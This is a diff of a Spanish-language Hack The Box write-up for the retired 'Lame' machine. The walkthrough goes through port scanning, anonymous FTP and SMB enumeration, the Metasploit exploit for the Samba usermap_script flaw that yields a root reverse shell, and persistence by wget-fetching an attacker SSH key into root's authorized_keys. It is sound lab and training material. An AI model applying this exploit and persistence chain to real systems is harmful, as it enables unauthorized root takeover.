@@ -1,13 +1,12 @@
 ---
 title: "HTB writeup: Lame"
 date: 2019-11-05T07:53:51-06:00
-draft: true
-description: ""
+description: "Lame, una de las primeras maquinas creadas en HTB y retirada hace bastante tiempo."
 tags: ["hackthebox", "htb", "legacy", "pentesting"]
 categories: ["htb", "pentesting"]
 ---
 
-
+Remember, Remember the 5 of november. Bueno comencé a realizar las maquinas retiradas de hackthebox para prepararme para el OSCP. Recién adquirí mi suscripción, esta fue la primera maquina en caer. Un resumen rápido es enumerar y enumerar. Cuando un camino se cierra, otro se abre.
 <!--more-->
 
 # Machine info
@@ -62,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 233.25 seconds
 - `-n` para no ejecutar resoluciones
 - `-v` para modo *verboso*
 
-Corroboremos con `masscan`:
+Como en otras ocasiones, verificamos los puertos abiertos con `masscan`:
 
 ```text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.3
@@ -166,9 +165,11 @@ Nmap done: 1 IP address (1 host up) scanned in 54.09 seconds
 - `-p139,445,3632,21` para unicamente los puertos descubiertos previamente
 - `-n` para no ejecutar resoluciones
 
+Con esta información concluimos que tenemos varios servicios abiertos, que tenemos una maquina Linux como target, con servicios de compartición de archivos tales como FTP y SMB. Verifiquemos que tanto podemos obtener del servicio de FTP.
+
 # FTP Service
 
-
+Como en otras maquinas, en lugar de entrar y verificar carpeta por carpeta, creare un espejo de lo entregado por el servicio:
 
 ```
 xbytemx@laptop:~/htb/lame$ wget --mirror ftp://10.10.10.3
@@ -195,6 +196,11 @@ No existe tal fichero “”.
 ACABADO --2019-10-05 19:39:12--
 Tiempo total de reloj: 3.0s
 Descargados: 1 ficheros, 119 en 0.001s (180 KB/s)
+```
+
+Al no encontrar nada relevante, me conecte usando un cliente de FTP y verifique:
+
+```
 xbytemx@laptop:~/htb/lame$ ftp 10.10.10.3
 Connected to 10.10.10.3.
 220 (vsFTPd 2.3.4)
@@ -217,7 +223,11 @@ ftp> bye
 xbytemx@laptop:~/htb/lame$
 ```
 
+No pudimos obtener mas información dentro del servicio, pero nos quedamos con la información de que tenemos acceso de manera anónima, el servidor es **vsFTPd** y que la versión del servidor es "2.3.4".
+
 # SMB service
+
+Ahora, exploremos el servicio de SMB utilizando `smbclient` de impacket:
 
 ```
 (impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ python smbclient.py 10.10.10.3
@@ -249,7 +259,11 @@ drw-rw-rw-          0  Sat Oct  5 19:16:03 2019 .X11-unix
 # exit
 ```
 
+Pudimos enumerar los recursos compartidos, pero no encontramos nada relevante que nos permita obtener mas información sobre la maquina. Busquemos exploits en el FTP.
+
 # Searchploit: FTP
+
+Utilizando `searchsploit`, encontraremos que la versión 2.3.4 de vsFTPd tiene una vulnerabilidad conocida, un backdoor de smile face:
 
 ```
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit ftp 2.3.4
@@ -260,9 +274,13 @@ xbytemx@laptop:~/git/exploit-database$ ./searchsploit ftp 2.3.4
 vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                | exploits/unix/remote/17491.rb
 -------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
 Shellcodes: No Result
+```
 
+Como podemos ver, la vulnerabilidad es tan popular que tiene su propio exploit en Metasploit.
 
-## msf5
+Utilizando `metasploit-framework`, tratemos de explotar la vulnerabilidad:
+
+```
 msf5 > search vsftpd
 
 Matching Modules
@@ -301,7 +319,13 @@ msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exit
 ```
 
+Como pudimos observar, aunque el exploit se ejecuto correctamente, no se reconecto al backdoor. Sin detenernos demasiado tiempo en explotar una vulnerabilidad, pasemos a enumerar mas el servicio de SMB.
+
 # SMB version enum
+
+En la etapa anterior no pudimos identificar la versión exacta de SMB corriendo, solo lo que de manera general nos entrego `nmap`. Pero si ejecutamos smbclient y nos conectamos de manera anónima, podemos obtener un poco de información al respecto.
+
+> Nota, esto varia mucho entre versiones de SMB, por lo que es importante seguir enumerando con diferentes herramientas o enumerar con la herramienta correcta, la version correcta.
 
 ```
 (impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ smbclient -L 10.10.10.3
@@ -327,7 +351,11 @@ Anonymous login successful
 	WORKGROUP            LAME
 ```
 
+Ok, `smbclient` nos devuelve que la versión de SMB es la 3.0.20~Debian. Realicemos el paso que hicimos con FTP dentro de `searchsploit`.
+
 # Searchploit: SMB
+
+Utilizando `searchsploit`, identificamos la siguiente vulnerabilidad:
 
 ```
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit Samba 3.0.20
@@ -341,7 +369,15 @@ Samba < 3.0.20 - Remote Heap Overflow                                           
 Shellcodes: No Result
 ```
 
+Nuevamente, `metasploit-framework` tiene escrito ya el exploit dentro del framework, así que pasemos a utilizarlo.
+
 # Command Execution
+
+Después de revisar este [exploit](https://github.com/amriunix/CVE-2007-2447), observaremos que su funcionamiento se basa en:
+
+> The root cause is passing unfiltered user input provided via MS-RPC calls to /bin/sh when invoking non-default "username map script" configuration option in smb.conf, so no authentication is needed to exploit this vulnerability.
+
+Básicamente cuando le pasamos el usuario durante la conexión, el nombre del usuario es usado para ejecutar comandos sobre sh, por lo que si mandamos expresiones de sustitución o evaluación script de sh, podemos ejecutar remotamente código que nos permita llamar a una conexión en reversa. Esto es lo que hace MSF tras bambalinas:
 
 ```
 msf5 > use exploit/multi/samba/usermap_script
@@ -384,7 +420,13 @@ id
 uid=0(root) gid=0(root)
 ```
 
+Perfecto, hemos obtenido una reverse shell como root. Ya tenemos acceso a todo el filesystem, pero que pasa si se parchea la vulnerabilidad o simplemente se cierra el servicio? Pues nos quedaríamos sin acceso y mas aun porque tenemos una reverse shell. Pasemos a la siguiente etapa.
+
 # Get SSH Access
+
+Aplicando la vieja confiable, agregamos nuestro certificado público en las llaves autorizadas de ssh para el usuario root. Esto es posible porque tenemos una shell remota y porque la configuración de ssh permite que root pueda ingresar.
+
+Comenzamos por iniciar un web server para compartir la llave:
 
 ```
 xbytemx@laptop:~/.ssh$ python3 -m http.server 4001
@@ -393,6 +435,8 @@ Serving HTTP on 0.0.0.0 port 4001 (http://0.0.0.0:4001/) ...
 ^C
 Keyboard interrupt received, exiting.
 ```
+
+Mientras tanto, en el reverse shell:
 
 ```
 wget http://10.10.14.2:4001/id_rsa.pub -O /root/.ssh/authorized_keys
@@ -406,6 +450,8 @@ Length: 568 [application/octet-stream]
 
 09:24:58 (176.39 MB/s) - `/root/.ssh/authorized_keys' saved [568/568]
 ```
+
+Perfecto, ya agregamos nuestra llave, ahora solo falta validar:
 
 ```
 xbytemx@laptop:~/.ssh$ ssh -i id_rsa root@10.10.10.3
@@ -425,7 +471,11 @@ You have new mail.
 root@lame:~#
 ```
 
+Boom, tenemos shell como root.
+
 # user.txt
+
+Ya desde esta shell, podemos tomar nuestras flags.
 
 ```
 root@lame:~# cat /home/makis/user.txt
@@ -433,11 +483,13 @@ root@lame:~# cat /home/makis/user.txt
 
 # root.txt
 
+Tomamos la flag de root:
+
 ```
 root@lame:~# cat /root/root.txt
 ```
 
-... We got root flag.
+... And we got root and user flag.
 
 ---
 
